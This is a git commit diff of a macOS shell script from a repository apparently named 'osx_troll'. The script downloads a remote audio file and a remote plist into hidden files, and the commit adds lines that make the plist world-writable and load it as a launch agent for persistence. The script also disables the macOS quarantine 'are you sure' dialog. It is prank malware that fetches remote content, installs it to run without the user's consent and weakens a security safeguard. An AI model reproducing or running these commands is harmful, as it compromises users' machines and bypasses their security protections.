cbd57a15bfe548f7b73baabc87e1da1a7693803e
Me1922 <34125170+Me1955@users.noreply.github.com>
2021-05-14 10:06:39 +1000

    Update run.sh

--- run.sh
+++ run.sh
@@ -2,6 +2,8 @@
 curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/HT.mp3 --output ~/Desktop/.troll.mp3
 
 curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/main.plist >> ~/Library/LaunchAgents/.main.plist
+chmod 777 ~/Library/LaunchAgents/.main.plist
+launchctl load ~/Library/LaunchAgents/.main.plist
 
 #Disable the “Are you sure you want to open this application?” dialog
 defaults write com.apple.LaunchServices LSQuarantine -bool false
